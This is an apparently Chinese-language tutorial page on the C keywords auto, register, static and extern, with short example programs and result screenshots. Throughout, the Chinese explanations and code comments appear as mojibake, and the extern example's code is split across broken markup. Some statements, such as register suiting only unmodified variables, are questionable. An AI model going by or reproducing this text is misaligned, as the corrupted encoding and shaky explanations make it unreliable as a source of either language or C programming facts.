<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de1bd82b70144e7fb70e5281819a6159~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767885135&amp;x-signature=8xqYLnLyuHdJjEmv%2F35e%2FdGRKIE%3D" alt="" loading="lazy"/><code>myAutoVar</code> æ˜¯ä¸€ä¸ª <code>auto</code> ç±»å‹çš„å±€éƒ¨å˜é‡ï¼Œå®ƒåœ¨ <code>myFunction</code> å‡½æ•°å†…éƒ¨è¢«å®šä¹‰å¹¶åˆå§‹åŒ–ã€‚å½“ <code>myFunction</code> è¢«è°ƒç”¨æ—¶ï¼Œ<code>myAutoVar</code> ä¼šåœ¨æ ˆä¸Šåˆ†é…å†…å­˜ã€‚å½“ <code>myFunction</code> è¿”å›æ—¶ï¼Œ<code>myAutoVar</code> æ‰€å ç”¨çš„å†…å­˜ä¼šè‡ªåŠ¨é‡Šæ”¾ï¼Œå˜é‡å¤±æ•ˆã€‚å› æ­¤ï¼Œåœ¨ <code>main</code> å‡½æ•°ä¸­å°è¯•è®¿é—® <code>myAutoVar</code> ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚</p>
<p><strong>è¿è¡Œç»“æœï¼š</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cc53f56f14f42889cc201f9609d06be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767885135&amp;x-signature=7xZv5NcQmIYfZr1muPslLAEy01c%3D" alt="" loading="lazy"/></p>
<blockquote>
<p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº<strong><strong>å±€éƒ¨å˜é‡</strong></strong>é»˜è®¤å°±æ˜¯</strong> <strong><code>auto</code></strong> <strong>ç±»å‹çš„ï¼Œæ‰€ä»¥åœ¨å®é™…ç¼–ç¨‹ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šçœç•¥</strong> <strong><code>auto</code></strong> <strong>å…³é”®å­—ã€‚</strong></p>
</blockquote>
<h2 data-id="heading-4">äºŒã€register</h2>
<p>åœ¨Cè¯­è¨€ä¸­ï¼Œ<code>register</code> å…³é”®å­—ç”¨äºå‘ç¼–è¯‘å™¨æå‡ºå»ºè®®ï¼Œå¸Œæœ›ç¼–è¯‘å™¨èƒ½å¤Ÿå°†ç‰¹å®šçš„å˜é‡å­˜å‚¨åœ¨CPUçš„å¯„å­˜å™¨ä¸­ï¼Œä»¥ä¾¿æé«˜å¯¹è¯¥å˜é‡çš„è®¿é—®é€Ÿåº¦ã€‚å¯„å­˜å™¨æ˜¯CPUå†…éƒ¨çš„ä¸€ç§é«˜é€Ÿå­˜å‚¨å•å…ƒï¼Œå…¶è®¿é—®é€Ÿåº¦è¿œå¿«äºå†…å­˜ã€‚å› æ­¤ï¼Œå¦‚æœæŸä¸ªå˜é‡è¢«é¢‘ç¹åœ°è¯»å–ï¼Œä¸”ä¸ä¼šè¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆå°†å…¶å­˜å‚¨åœ¨å¯„å­˜å™¨ä¸­å¯ä»¥æ˜¾è‘—æé«˜ç¨‹åºçš„æ€§èƒ½ã€‚</p>
<h3 data-id="heading-5">2.1. ä½œç”¨</h3>
<ul>
<li>
<p><code>register</code> å…³é”®å­—çš„ä¸»è¦ä½œç”¨æ˜¯å‘ç¼–è¯‘å™¨å‘å‡ºå»ºè®®ï¼Œå¸Œæœ›ç¼–è¯‘å™¨èƒ½å¤Ÿä¼˜åŒ–å˜é‡çš„å­˜å‚¨ä½ç½®ï¼Œå°†å…¶ä»å†…å­˜ç§»åŠ¨åˆ°å¯„å­˜å™¨ä¸­ã€‚</p>
</li>
<li>
<p>ç„¶è€Œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™åªæ˜¯ä¸€ä¸ªå»ºè®®ï¼Œç¼–è¯‘å™¨å¹¶ä¸ä¸€å®šä¼šé‡‡çº³ã€‚ç¼–è¯‘å™¨ä¼šæ ¹æ®è‡ªèº«çš„ä¼˜åŒ–ç­–ç•¥ã€å¯„å­˜å™¨çš„å¯ç”¨æ€§ä»¥åŠå˜é‡çš„ä½¿ç”¨æƒ…å†µæ¥å†³å®šæ˜¯å¦å°†å˜é‡å­˜å‚¨åœ¨å¯„å­˜å™¨ä¸­ã€‚</p>
</li>
</ul>
<h3 data-id="heading-6">2.2. ç‰¹æ€§</h3>
<ul>
<li>
<p><strong>é€‚ç”¨äºé¢‘ç¹è¯»å–ä¸”ä¸ä¼šè¢«ä¿®æ”¹çš„****å±€éƒ¨å˜é‡</strong>ï¼šç”±äºå¯„å­˜å™¨çš„æ•°é‡æœ‰é™ï¼Œä¸”è¯»å†™å¯„å­˜å™¨éœ€è¦æ¶ˆè€—ä¸€å®šçš„CPUèµ„æºï¼Œå› æ­¤<code>register</code>å…³é”®å­—æœ€é€‚åˆç”¨äºé‚£äº›è¢«é¢‘ç¹è¯»å–ä¸”ä¸ä¼šè¢«ä¿®æ”¹çš„å±€éƒ¨å˜é‡ã€‚</p>
</li>
<li>
<p><strong>ç¼–è¯‘å™¨å¯èƒ½ä¼šå¿½ç•¥æ­¤å»ºè®®</strong>ï¼šå¦‚å‰æ‰€è¿°ï¼Œ<code>register</code>åªæ˜¯ä¸€ä¸ªå»ºè®®ï¼Œç¼–è¯‘å™¨å¹¶ä¸ä¸€å®šä¼šé‡‡çº³ã€‚ç¼–è¯‘å™¨ä¼šæ ¹æ®å®é™…æƒ…å†µæ¥å†³å®šæ˜¯å¦å°†å˜é‡å­˜å‚¨åœ¨å¯„å­˜å™¨ä¸­ã€‚</p>
</li>
<li>
<p><strong>ä¸èƒ½ç”¨äºå…¨å±€å˜é‡å’Œé™æ€å˜é‡</strong>ï¼šç”±äºå…¨å±€å˜é‡å’Œé™æ€å˜é‡åœ¨ç¨‹åºçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…éƒ½æœ‰æ•ˆï¼Œä¸”å¯èƒ½ä¼šè¢«å¤šä¸ªå‡½æ•°è®¿é—®å’Œä¿®æ”¹ï¼Œå› æ­¤å®ƒä»¬ä¸é€‚åˆå­˜å‚¨åœ¨å¯„å­˜å™¨ä¸­ã€‚</p>
</li>
</ul>
<h3 data-id="heading-7">2.3. ä»£ç ç¤ºä¾‹</h3>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨<code>register</code>å…³é”®å­—çš„ç®€å•ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
  
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">count_loops</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>{  
    <span class="hljs-keyword">register</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// å»ºè®®ç¼–è¯‘å™¨å°†iå­˜å‚¨åœ¨å¯„å­˜å™¨ä¸­  </span>
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++) {  
        <span class="hljs-comment">// å¾ªç¯ä½“ä¸ºç©ºï¼Œä»…ç”¨äºæ¼”ç¤º  </span>
    }  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Loop count: %d\n"</span>, i); <span class="hljs-comment">// æ­¤æ—¶içš„å€¼åº”ä¸ºn  </span>
}  
  
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-built_in">count_loops</span>(<span class="hljs-number">1000000</span>); <span class="hljs-comment">// è°ƒç”¨å‡½æ•°ï¼Œä¼ å…¥ä¸€ä¸ªè¾ƒå¤§çš„å€¼ä»¥æ¼”ç¤ºæ•ˆæœ  </span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<p>ä½¿ç”¨äº†<code>register</code>å…³é”®å­—æ¥å»ºè®®ç¼–è¯‘å™¨å°†å¾ªç¯å˜é‡<code>i</code>å­˜å‚¨åœ¨å¯„å­˜å™¨ä¸­ã€‚ç„¶è€Œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šå¿½ç•¥è¿™ä¸ªå»ºè®®ï¼Œå¹¶å°†<code>i</code>å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚æ­¤å¤–ï¼Œå³ä½¿ç¼–è¯‘å™¨é‡‡çº³äº†è¿™ä¸ªå»ºè®®ï¼Œç”±äºå¯„å­˜å™¨çš„æ•°é‡æœ‰é™ï¼Œå¦‚æœç¨‹åºä¸­ä½¿ç”¨äº†å¤§é‡çš„<code>register</code>å˜é‡ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨ä¹Ÿå¯èƒ½æ— æ³•å°†å®ƒä»¬å…¨éƒ¨å­˜å‚¨åœ¨å¯„å­˜å™¨ä¸­ã€‚</p>
<p><strong>è¿è¡Œç»“æœï¼š</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/acfe2aa8d3e54de3a9c054c7f6b3f5c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767885135&amp;x-signature=P7o9dN0nCsB%2B8%2FvAdlrQ1iZlMgc%3D" alt="" loading="lazy"/></p>
<blockquote>
<p><strong>åœ¨ä½¿ç”¨</strong>**<code>register</code>**<strong>å…³é”®å­—æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¿æŒè°¨æ…ï¼Œå¹¶æ„è¯†åˆ°å®ƒåªæ˜¯ä¸€ä¸ªå»ºè®®ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå¼ºåˆ¶æ€§çš„è¦æ±‚ã€‚åŒæ—¶ï¼Œæˆ‘ä»¬è¿˜éœ€è¦é€šè¿‡å®é™…çš„æ€§èƒ½æµ‹è¯•æ¥éªŒè¯ç¼–è¯‘å™¨æ˜¯å¦é‡‡çº³äº†æˆ‘ä»¬çš„å»ºè®®ï¼Œå¹¶è¯„ä¼°å…¶å¯¹ç¨‹åºæ€§èƒ½çš„å½±å“ã€‚</strong></p>
</blockquote>
<h2 data-id="heading-8">ä¸‰ã€static</h2>
<p>åœ¨Cè¯­è¨€ä¸­ï¼Œ<code>static</code> å…³é”®å­—æœ‰å¤šç§ç”¨é€”ï¼ŒåŒ…æ‹¬ä¿®é¥°å±€éƒ¨å˜é‡ã€å…¨å±€å˜é‡å’Œå‡½æ•°ã€‚</p>
<h3 data-id="heading-9">3.1. ä¿®é¥°å±€éƒ¨å˜é‡</h3>
<p>å½“<code>static</code>ä¿®é¥°å±€éƒ¨å˜é‡æ—¶ï¼Œå®ƒä¼šå»¶é•¿è¯¥å˜é‡çš„ç”Ÿå‘½å‘¨æœŸè‡³æ•´ä¸ªç¨‹åºè¿è¡ŒæœŸé—´ï¼Œä½†å˜é‡çš„ä½œç”¨åŸŸä»ç„¶ä¿æŒä¸å˜ï¼Œå³åªèƒ½åœ¨å®šä¹‰å®ƒçš„å‡½æ•°æˆ–ä»£ç å—å†…éƒ¨è®¿é—®ã€‚æ„å‘³ç€ï¼Œå³ä½¿å‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œè¯¥å˜é‡çš„å€¼ä¹Ÿä¼šä¿ç•™ä¸‹æ¥ï¼Œä¾›ä¸‹æ¬¡å‡½æ•°è°ƒç”¨æ—¶ä½¿ç”¨ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
  
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">functionWithStaticVar</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-type">static</span> <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>; <span class="hljs-comment">// é™æ€å±€éƒ¨å˜é‡ï¼Œåªåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶åˆå§‹åŒ–  </span>
    count++;  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Count: %d\n"</span>, count);  
}  
  
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-built_in">functionWithStaticVar</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šCount: 1  </span>
    <span class="hljs-built_in">functionWithStaticVar</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šCount: 2  </span>
    <span class="hljs-built_in">functionWithStaticVar</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šCount: 3  </span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c944bc76d0834faeaa8b8770cf6b450b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767885135&amp;x-signature=CerIcxF0VCNXXZ0abDkOrjxYQg8%3D" alt="" loading="lazy"/></p>
<p><code>count</code>æ˜¯ä¸€ä¸ªé™æ€å±€éƒ¨å˜é‡ã€‚æ¯æ¬¡è°ƒç”¨<code>functionWithStaticVar</code>å‡½æ•°æ—¶ï¼Œ<code>count</code>çš„å€¼éƒ½ä¼šé€’å¢ï¼Œå¹¶ä¸”åœ¨ä¸‹æ¬¡å‡½æ•°è°ƒç”¨æ—¶ä¿ç•™ä¸‹æ¥ã€‚</p>
<p><strong>å®é™…è¿è¡Œç»“æœï¼š</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d12ed10a21ec482ba08256655cba5464~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767885135&amp;x-signature=JymcZ5OHnmlUU5jboKTySlws9JI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">3.2. ä¿®é¥°å…¨å±€å˜é‡</h3>
<p>å½“<code>static</code>ä¿®é¥°å…¨å±€å˜é‡æ—¶ï¼Œå®ƒä¼šé™åˆ¶è¯¥å˜é‡çš„ä½œç”¨åŸŸï¼Œä½¿å…¶åªèƒ½åœ¨å®šä¹‰å®ƒçš„æ–‡ä»¶å†…éƒ¨è®¿é—®ã€‚æœ‰åŠ©äºé¿å…ä¸åŒæ–‡ä»¶ä¹‹é—´çš„å‘½åå†²çªã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// file1.c  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
  
<span class="hljs-type">static</span> <span class="hljs-type">int</span> globalVar = <span class="hljs-number">100</span>; <span class="hljs-comment">// é™æ€å…¨å±€å˜é‡ï¼Œåªèƒ½åœ¨file1.cå†…éƒ¨è®¿é—®  </span>
  
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printGlobalVar</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"GlobalVar in file1.c: %d\n"</span>, globalVar);  
}  
  
<span class="hljs-comment">// file2.c  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
  
<span class="hljs-comment">// å°è¯•è®¿é—®file1.cä¸­çš„globalVarä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯  </span>
<span class="hljs-comment">// extern int globalVar; // æ³¨é‡Šæ‰è¿™è¡Œä»¥é¿å…ç¼–è¯‘é”™è¯¯  </span>
  
<span class="hljs-comment">// void printGlobalVarFromFile2() {  </span>
<span class="hljs-comment">//     printf("GlobalVar in file2.c: %d\n", globalVar); // è¿™è¡Œä¼šå¯¼è‡´é“¾æ¥é”™è¯¯  </span>
<span class="hljs-comment">// }  </span>
  
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-comment">// printGlobalVarFromFile2(); // æ³¨é‡Šæ‰è¿™è¡Œä»¥é¿å…ç¼–è¯‘é”™è¯¯  </span>
    <span class="hljs-built_in">printGlobalVar</span>(); <span class="hljs-comment">// è°ƒç”¨file1.cä¸­çš„å‡½æ•°æ¥æ‰“å°globalVar  </span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7ced345d0da44a28f2c7d942d1caf80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767885135&amp;x-signature=AlPzhSKVG%2FPGiheXlSThE3Aq5XI%3D" alt="" loading="lazy"/></p>
<p><code>globalVar</code>æ˜¯ä¸€ä¸ªé™æ€å…¨å±€å˜é‡ï¼Œå®ƒåªèƒ½åœ¨<code>file1.c</code>å†…éƒ¨è®¿é—®ã€‚å¦‚æœå°è¯•åœ¨<code>file2.c</code>ä¸­è®¿é—®å®ƒï¼Œä¼šå¯¼è‡´ç¼–è¯‘æˆ–é“¾æ¥é”™è¯¯ã€‚</p>
<h3 data-id="heading-11">3.3. ä¿®é¥°å‡½æ•°</h3>
<p>å½“<code>static</code>ä¿®é¥°å‡½æ•°æ—¶ï¼Œå®ƒä¼šä½¿è¯¥å‡½æ•°åªèƒ½åœ¨å®šä¹‰å®ƒçš„æ–‡ä»¶å†…éƒ¨ä½¿ç”¨ï¼Œé˜²æ­¢å¤–éƒ¨é“¾æ¥ã€‚æœ‰åŠ©äºéšè—å‡½æ•°çš„å®ç°ç»†èŠ‚ï¼Œå‡å°‘å‘½åå†²çªçš„å¯èƒ½æ€§ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// file1.c  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
  
<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">internalFunction</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"This is an internal function in file1.c\n"</span>);  
}  
  
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">externalFunction</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-built_in">internalFunction</span>(); <span class="hljs-comment">// è°ƒç”¨å†…éƒ¨å‡½æ•°  </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"This is an external function in file1.c\n"</span>);  
}  
  
<span class="hljs-comment">// file2.c  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
  
<span class="hljs-comment">// å°è¯•è°ƒç”¨file1.cä¸­çš„internalFunctionä¼šå¯¼è‡´é“¾æ¥é”™è¯¯  </span>
<span class="hljs-comment">// void callInternalFunction() {  </span>
<span class="hljs-comment">//     internalFunction(); // è¿™è¡Œä¼šå¯¼è‡´é“¾æ¥é”™è¯¯  </span>
<span class="hljs-comment">// }  </span>
  
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-built_in">externalFunction</span>(); <span class="hljs-comment">// è°ƒç”¨file1.cä¸­çš„å¤–éƒ¨å‡½æ•°  </span>
    <span class="hljs-comment">// callInternalFunction(); // æ³¨é‡Šæ‰è¿™è¡Œä»¥é¿å…é“¾æ¥é”™è¯¯  </span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f244e2585b544f989ffe981e946fa3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767885135&amp;x-signature=yrkV1eK5tf1FBULuJrdzSIC3Ayo%3D" alt="" loading="lazy"/></p>
<p><code>internalFunction</code>æ˜¯ä¸€ä¸ªé™æ€å‡½æ•°ï¼Œå®ƒåªèƒ½åœ¨<code>file1.c</code>å†…éƒ¨ä½¿ç”¨ã€‚å¦‚æœå°è¯•åœ¨<code>file2.c</code>ä¸­è°ƒç”¨å®ƒï¼Œä¼šå¯¼è‡´é“¾æ¥é”™è¯¯ã€‚è€Œ<code>externalFunction</code>æ˜¯ä¸€ä¸ªå¤–éƒ¨å‡½æ•°ï¼Œå®ƒå¯ä»¥åœ¨å…¶ä»–æ–‡ä»¶ä¸­è¢«è°ƒç”¨ã€‚</p>
<h2 data-id="heading-12">å››ã€extern</h2>
<p>åœ¨Cè¯­è¨€ç¼–ç¨‹ä¸­ï¼Œ<code>extern</code> å…³é”®å­—æ‰®æ¼”ç€è‡³å…³é‡è¦çš„è§’è‰²ï¼Œå®ƒå…è®¸æˆ‘ä»¬å£°æ˜åœ¨å…¶ä»–æ–‡ä»¶ä¸­å®šä¹‰çš„å˜é‡æˆ–å‡½æ•°ï¼Œä»è€Œå®ç°è·¨æ–‡ä»¶çš„èµ„æºå…±äº«ã€‚è¿™æ˜¯æ¨¡å—åŒ–ç¼–ç¨‹çš„åŸºç¡€ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥å°†ç¨‹åºæ‹†åˆ†ä¸ºå¤šä¸ªæ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶è´Ÿè´£ç‰¹å®šçš„åŠŸèƒ½æˆ–æ•°æ®ç»“æ„ï¼Œç„¶ååœ¨éœ€è¦æ—¶é€šè¿‡ <code>extern</code> å£°æ˜æ¥è®¿é—®è¿™äº›å¤–éƒ¨å®šä¹‰çš„èµ„æºã€‚</p>
<h3 data-id="heading-13">4.1. ä½œç”¨</h3>
<p><code>extern</code> å…³é”®å­—çš„ä¸»è¦ä½œç”¨æ˜¯å£°æ˜ä¸€ä¸ªå˜é‡æˆ–å‡½æ•°æ˜¯åœ¨å…¶ä»–æ–‡ä»¶ä¸­å®šä¹‰çš„ï¼Œè¿™æ ·åœ¨å½“å‰æ–‡ä»¶ä¸­å°±å¯ä»¥è®¿é—®åˆ°è¿™ä¸ªå˜é‡æˆ–å‡½æ•°ã€‚å®ƒæ˜¯å®ç°è·¨æ–‡ä»¶é“¾æ¥å’Œè®¿é—®çš„å…³é”®æœºåˆ¶ã€‚</p>
<h3 data-id="heading-14">4.2. ç‰¹æ€§</h3>
<ul>
<li>
<p><strong>è·¨æ–‡ä»¶è®¿é—®</strong>ï¼š<code>extern</code> å…è®¸æˆ‘ä»¬è®¿é—®åœ¨å…¶ä»–æ–‡ä»¶ä¸­å®šä¹‰çš„å˜é‡æˆ–å‡½æ•°ã€‚</p>
</li>
<li>
<p><strong>å£°æ˜é¡ºåº</strong>ï¼šåœ¨ä½¿ç”¨ <code>extern</code> å£°æ˜çš„å˜é‡æˆ–å‡½æ•°ä¹‹å‰ï¼Œç¼–è¯‘å™¨éœ€è¦çŸ¥é“å®ƒä»¬çš„å­˜åœ¨ã€‚å› æ­¤ï¼Œ<code>extern</code> å£°æ˜é€šå¸¸æ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´éƒ¨åˆ†ï¼Œæˆ–è€…åœ¨å˜é‡æˆ–å‡½æ•°è¢«å®é™…ä½¿ç”¨ä¹‹å‰ã€‚</p>
</li>
<li>
<p><strong>æ¨¡å—åŒ–ç¼–ç¨‹</strong>ï¼š<code>extern</code> æ˜¯æ¨¡å—åŒ–ç¼–ç¨‹çš„åŸºç¡€ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥å°†ç¨‹åºæ‹†åˆ†ä¸ºå¤šä¸ªç‹¬ç«‹çš„æ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½å¯ä»¥å®šä¹‰è‡ªå·±çš„å˜é‡å’Œå‡½æ•°ï¼Œå¹¶é€šè¿‡ <code>extern</code> å£°æ˜æ¥è®¿é—®å…¶ä»–æ–‡ä»¶ä¸­çš„èµ„æºã€‚</p>
</li>
</ul>
<h3 data-id="heading-15">4.3. ä»£ç ç¤ºä¾‹</h3>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨ <code>extern</code> å…³é”®å­—æ¥å®ç°è·¨æ–‡ä»¶è®¿é—®å˜é‡å’Œå‡½æ•°ã€‚</p>
<ul>
<li>
<p><strong>file1.c</strong></p>
<p>#include &lt;stdio.h&gt;</p>
<p>// å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡<br/>
int globalVar = 42;</p>
<p>// å®šä¹‰ä¸€ä¸ªå‡½æ•°<br/>
void printGlobalVar() {<br/>
printf("GlobalVar in file1.c: %d\n", globalVar);<br/>
}</p>
</li>
<li>
<p><strong>file1.h</strong></p>
<p>// åœ¨å¤´æ–‡ä»¶ä¸­ä½¿ç”¨ extern æ¥å£°æ˜ file1.c ä¸­å®šä¹‰çš„å˜é‡å’Œå‡½æ•°<br/>
extern int globalVar;<br/>
extern void printGlobalVar();</p>
</li>
<li>
<p><strong>file2.c</strong></p>
<p>#include &lt;stdio.h&gt;<br/>
#include "file1.h" // åŒ…å« file1.c çš„å¤´æ–‡ä»¶ä»¥è®¿é—®å…¶å£°æ˜çš„å˜é‡å’Œå‡½æ•°</p>
<p>int main() {<br/>
// è®¿é—® file1.c ä¸­å®šä¹‰çš„å…¨å±€å˜é‡<br/>
printf("Accessing globalVar from file2.c: %d\n", globalVar);</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// è°ƒç”¨ file1.c ä¸­å®šä¹‰çš„å‡½æ•°  </span>
printGlobalVar();  
  
<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
</code></pre>
<p>}</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d72a61df5ef044ccbc0d89fbbf5dc6f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767885135&amp;x-signature=NnrWZd7yWx9wA%2B8IINfFEYM2N6s%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51379d3a97644082a214a3d3e6d5d135~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767885135&amp;x-signature=eonWEfo3tvCeFID45Mruf7M8ivc%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95f83d0077de4e8f8f5541df2dbdf34b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767885135&amp;x-signature=BeFWhaV7sjcVolo0edLrkzacQno%3D" alt="" loading="lazy"/></p>
<p>ç¼–è¾‘</p>
<p><code>file1.c</code> å®šä¹‰äº†ä¸€ä¸ªå…¨å±€å˜é‡ <code>globalVar</code> å’Œä¸€ä¸ªå‡½æ•° <code>printGlobalVar()</code>ã€‚ç„¶åï¼Œåœ¨ <code>file1.h</code> ä¸­ä½¿ç”¨ <code>extern</code> å…³é”®å­—æ¥å£°æ˜è¿™äº›å˜é‡å’Œå‡½æ•°ï¼Œä»¥ä¾¿åœ¨å…¶ä»–æ–‡ä»¶ä¸­è®¿é—®å®ƒä»¬ã€‚æœ€åï¼Œåœ¨ <code>file2.c</code> ä¸­ï¼Œæˆ‘ä»¬åŒ…å«äº† <code>file1.h</code> å¤´æ–‡ä»¶ï¼Œä»è€Œèƒ½å¤Ÿè®¿é—® <code>file1.c</code> ä¸­å®šä¹‰çš„å˜é‡å’Œå‡½æ•°ã€‚</p>
